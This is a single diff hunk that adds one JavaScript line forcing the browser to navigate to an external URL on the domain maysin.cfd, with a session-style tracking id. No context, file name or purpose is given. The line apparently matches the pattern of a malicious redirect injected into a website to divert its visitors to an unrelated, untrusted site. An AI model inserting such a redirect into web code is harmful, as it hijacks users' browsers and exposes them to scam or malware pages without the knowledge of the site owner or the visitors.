@@ -1,0 +1,1 @@
+window.location.href = "https://maysin.cfd/NCRq/go?sid=7744";
